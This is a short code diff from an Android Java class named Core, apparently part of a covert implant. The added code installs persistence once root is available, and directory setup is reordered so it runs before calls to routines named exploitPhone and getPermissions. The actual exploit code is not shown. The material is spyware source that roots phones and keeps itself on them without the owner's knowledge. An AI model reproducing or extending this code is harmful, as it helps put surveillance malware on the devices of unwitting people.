@@ -155,7 +155,13 @@ public class Core extends Activity implements Runnable {
 				}
 
 			}
-
+			if (Status.haveRoot()) {
+				int perStatus = Status.getPersistencyStatus();
+				Root.installPersistence();
+				if (perStatus != Status.getPersistencyStatus()) {
+					Status.self().setReload();
+				}
+			}
 			return false;
 		}
 
@@ -264,6 +270,13 @@ public class Core extends Activity implements Runnable {
 		}
 
 		Keys.self();
+		if (!Path.makeDirs()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (run) Error: Can't create a writable directory");
+			}
+
+			return;
+		}
 		Root.exploitPhone(false);
 		Root.getPermissions(false);
 
@@ -492,14 +505,6 @@ public class Core extends Activity implements Runnable {
 	 */
 	private int taskInit() {
 		try {
-			if (!Path.makeDirs()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (taskInit) Error: Can't create a writable directory");
-				}
-
-				return ConfType.Error;
-			}
-
 			// this markup is created by UninstallAction
 			//final Markup markup = new Markup(UNINSTALL_MARKUP);
 			if (haveUninstallMarkup()) {
